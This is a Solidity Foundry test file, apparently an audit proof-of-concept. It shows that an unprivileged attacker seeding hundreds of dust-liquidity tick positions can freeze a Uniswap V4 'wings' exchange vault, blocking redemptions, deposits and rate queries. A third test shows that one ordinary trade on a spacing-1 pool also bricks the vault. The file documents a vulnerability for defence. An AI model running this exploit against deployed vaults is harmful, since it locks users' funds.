// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {TestBase_UniswapV4UpperLowerWingsStandardExchangeVault} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/test/bases/TestBase_UniswapV4UpperLowerWingsStandardExchangeVault.sol";
import {IUniswapV4UpperLowerWingsStandardExchangeVault} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/interfaces/IUniswapV4UpperLowerWingsStandardExchangeVault.sol";
import {IUniswapV4UpperLowerWingsStandardExchangeVaultDFPkg} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/interfaces/IUniswapV4UpperLowerWingsStandardExchangeVaultDFPkg.sol";
import {UniswapV4UpperLowerWingsStandardExchangeVaultLiquidationQuote as Quote} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/UniswapV4UpperLowerWingsStandardExchangeVaultLiquidationQuote.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IRateProvider} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/IRateProvider.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/BalanceDelta.sol";
import {ModifyLiquidityParams, SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TickMath.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";

/// @notice Generic V4 router: LP add/remove (batched) and swaps. Used by honest LP, trader and attacker alike.
contract V4Actor is IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    IPoolManager internal immutable manager;
    address internal immutable controller;

    struct Batch { uint8 op; PoolKey key; int24 start; int24 width; uint256 n; int256 liquidity; bool zeroForOne; uint256 amount; uint160 limit; }

    constructor(IPoolManager manager_, address controller_) { manager = manager_; controller = controller_; }

    function seed(PoolKey memory key_, int24 start_, int24 width_, uint256 n_, int256 liquidity_) external {
        require(msg.sender == controller, "ctl");
        manager.unlock(abi.encode(Batch(0, key_, start_, width_, n_, liquidity_, false, 0, 0)));
    }
    function swapTo(PoolKey memory key_, bool zeroForOne_, uint256 amount_, uint160 limit_) external {
        require(msg.sender == controller, "ctl");
        manager.unlock(abi.encode(Batch(1, key_, 0, 0, 0, 0, zeroForOne_, amount_, limit_)));
    }
    function approve(IERC20 t, address s) external { require(msg.sender == controller, "ctl"); t.approve(s, type(uint256).max); }

    function unlockCallback(bytes calldata data_) external returns (bytes memory) {
        require(msg.sender == address(manager), "mgr");
        Batch memory b = abi.decode(data_, (Batch));
        int256 d0; int256 d1;
        if (b.op == 0) {
            for (uint256 i; i < b.n; ++i) {
                int24 lo = b.start + int24(int256(i)) * b.width;
                (BalanceDelta delta,) = manager.modifyLiquidity(b.key, ModifyLiquidityParams(lo, lo + b.width, b.liquidity, bytes32(0)), "");
                d0 += delta.amount0(); d1 += delta.amount1();
            }
        } else {
            BalanceDelta delta = manager.swap(b.key, SwapParams(b.zeroForOne, -int256(b.amount), b.limit), "");
            d0 = delta.amount0(); d1 = delta.amount1();
        }
        _settle(b.key.currency0, d0);
        _settle(b.key.currency1, d1);
        return "";
    }
    function _settle(Currency c, int256 d) internal {
        if (d < 0) {
            manager.sync(c);
            IERC20(Currency.unwrap(c)).transfer(address(manager), uint256(-d));
            manager.settle();
        } else if (d > 0) {
            manager.take(c, address(this), uint256(d));
        }
    }
}

contract WingsQuoteCapDosTest is TestBase_UniswapV4UpperLowerWingsStandardExchangeVault {
    using StateLibrary for IPoolManager;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address attackerEOA = makeAddr("attacker");
    address lpEOA = makeAddr("honestLP");
    address traderEOA = makeAddr("trader");
    V4Actor trader;
    V4Actor attacker;
    V4Actor lp;

    function setUp() public override {
        super.setUp();
        trader = new V4Actor(pool, traderEOA);
        attacker = new V4Actor(pool, attackerEOA);
        lp = new V4Actor(pool, lpEOA);
        token0.mint(address(trader), 1e30); token1.mint(address(trader), 1e30);
        token0.mint(address(lp), 1e30); token1.mint(address(lp), 1e30);
        token0.mint(alice, 1e20); token0.mint(bob, 1e20);
        // attacker budget: small, accounted as cost (dust only)
        token0.mint(address(attacker), 1e6); token1.mint(address(attacker), 1e6);
    }

    function _deposit(IUniswapV4UpperLowerWingsStandardExchangeVault v, address who, uint256 amt) internal returns (uint256) {
        vm.startPrank(who);
        token0.approve(address(v), type(uint256).max);uint256 s = IStandardExchangeIn(address(v)).exchangeIn(token0, amt, IERC20(address(v)), 0, who, false, block.timestamp);
        vm.stopPrank();
        return s;
    }

    function _bal(address a) internal view returns (uint256) { return token0.balanceOf(a) + token1.balanceOf(a); }

    function _assertFrozen(IUniswapV4UpperLowerWingsStandardExchangeVault v, uint256 aliceShares) internal {
        bytes memory err = abi.encodeWithSelector(Quote.QuoteWorkExceeded.selector, 512);
        uint256 a0 = token0.balanceOf(alice);
        vm.prank(alice);
        vm.expectRevert(err);IStandardExchangeIn(address(v)).exchangeIn(IERC20(address(v)), aliceShares, token0, 0, alice, false, block.timestamp);
        console2.log("alice redeem(all shares) -> QuoteWorkExceeded(512)");
        vm.prank(alice);
        vm.expectRevert(err);IStandardExchangeIn(address(v)).exchangeIn(IERC20(address(v)), aliceShares / 100, token0, 0, alice, false, block.timestamp);
        console2.log("alice redeem(1% shares) -> QuoteWorkExceeded(512)");
        vm.startPrank(bob);
        token0.approve(address(v), type(uint256).max);
        vm.expectRevert(err);IStandardExchangeIn(address(v)).exchangeIn(token0, 1e9, IERC20(address(v)), 0, bob, false, block.timestamp);
        vm.stopPrank();
        console2.log("bob deposit -> QuoteWorkExceeded(512)");
        vm.expectRevert(err);
        IRateProvider(address(v)).getRate();
        console2.log("getRate -> QuoteWorkExceeded(512)");
        vm.expectRevert(err);
        v.liquidationValue();
        assertEq(IERC20(address(v)).balanceOf(alice), aliceShares, "alice shares untouched");
        assertEq(token0.balanceOf(alice), a0, "alice got nothing out");
    }

    /// Variant A: deployed fixture params (fee 3000, spacing 60), vault is sole LP. Attacker seeds dust ticks.
    function test_A_dustTicks_spacing60_freezesVault() public {
        IUniswapV4UpperLowerWingsStandardExchangeVault v = wings0;
        uint256 aliceShares = _deposit(v, alice, 1e12);
        // normal market activity converts part of the upper wing into token1 (vault now holds opposing inventory)
        vm.prank(traderEOA); trader.swapTo(key, false, 1e20, TickMath.getSqrtPriceAtTick(120));
        _deposit(v, bob, 1e10);
        Quote.Result memory pre = v.liquidationValue();
        console2.log("pre-attack quote steps", pre.steps);
        console2.log("pre-attack value", pre.value);
        console2.log("pre-attack unsold", pre.unsold);
        uint256 rateBefore = IRateProvider(address(v)).getRate();
        console2.log("pre-attack getRate", rateBefore);
        (, int24 tick,,) = pool.getSlot0(key.toId());
        console2.log("tick after trade", int256(tick));

        // ATTACK: unprivileged attacker adds 480 adjacent 1-spacing positions of liquidity 1 above price
        uint256 b0 = _bal(address(attacker));
        int24 start = ((tick / 60) + 1) * 60;
        for (uint256 i; i < 4; ++i) {
            vm.prank(attackerEOA);
            attacker.seed(key, start + int24(int256(i * 120)) * 60, 60, 120, 1);
        }
        uint256 cost = b0 - _bal(address(attacker));
        console2.log("attacker token cost (wei, recoverable)", cost);

        _assertFrozen(v, aliceShares);

        // attacker can withdraw dust later (cost fully recoverable)
        for (uint256 i; i < 4; ++i) {
            vm.prank(attackerEOA);
            attacker.seed(key, start + int24(int256(i * 120)) * 60, 60, 120, -1);
        }
        console2.log("attacker net cost after unwinding", b0 - _bal(address(attacker)));
        // after unwinding, redeem works again -> proves dust ticks were the sole cause
        vm.prank(alice);uint256 out = IStandardExchangeIn(address(v)).exchangeIn(IERC20(address(v)), aliceShares, token0, 0, alice, false, block.timestamp);
        console2.log("alice redeem after unwind", out);
        assertGt(out, 0);
    }

    function _spacing1Vault(uint24 fee) internal returns (PoolKey memory k, IUniswapV4UpperLowerWingsStandardExchangeVault v) {
        k = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), fee, 1, IHooks(address(0)));
        pool.initialize(k, uint160(1) << 96);
        v = IUniswapV4UpperLowerWingsStandardExchangeVault(wingsPackage.deployVault(
            IUniswapV4UpperLowerWingsStandardExchangeVaultDFPkg.PkgArgs(k, address(token0))));
    }

    /// Variant B: spacing-1 (0.01% tier) pool, vault is sole LP. NO attacker: one ordinary trade bricks the vault.
    function test_B_natural_spacing1_soleLP() public {
        (PoolKey memory k, IUniswapV4UpperLowerWingsStandardExchangeVault v) = _spacing1Vault(100);
        uint256 aliceShares = _deposit(v, alice, 1e12);
        console2.log("alice shares", aliceShares);
        console2.log("getRate before trade", IRateProvider(address(v)).getRate());
        vm.prank(traderEOA); trader.swapTo(k, false, 1e20, TickMath.getSqrtPriceAtTick(50));
        _assertFrozen(v, aliceShares);
    }

    /// Variant C: spacing-1 pool with an honest external full-range LP of the same size as the vault.
    /// Quote works before the attack; attacker dust ticks then freeze it.
    function test_C_dustTicks_spacing1_withExternalLP() public {
        (PoolKey memory k, IUniswapV4UpperLowerWingsStandardExchangeVault v) = _spacing1Vault(100);
        int24 maxT = TickMath.maxUsableTick(1);
        vm.prank(lpEOA); lp.seed(k, -maxT, 2 * maxT, 1, int256(1e12));
        uint256 aliceShares = _deposit(v, alice, 1e12);
        vm.prank(traderEOA); trader.swapTo(k, false, 1e20, TickMath.getSqrtPriceAtTick(1000));
        _deposit(v, bob, 1e10);
        Quote.Result memory pre = v.liquidationValue();
        console2.log("pre-attack quote steps", pre.steps);
        console2.log("pre-attack value", pre.value);
        console2.log("pre-attack sold", pre.sold);
        console2.log("pre-attack getRate", IRateProvider(address(v)).getRate());
        (, int24 tick,,) = pool.getSlot0(k.toId());
        console2.log("tick after trade", int256(tick));

        uint256 b0 = _bal(address(attacker));
        for (uint256 i; i < 5; ++i) {
            vm.prank(attackerEOA);
            attacker.seed(k, tick + 1 + int24(int256(i * 110)), 1, 110, 1);
        }
        console2.log("attacker token cost (wei, recoverable)", b0 - _bal(address(attacker)));
        _assertFrozen(v, aliceShares);
    }
}
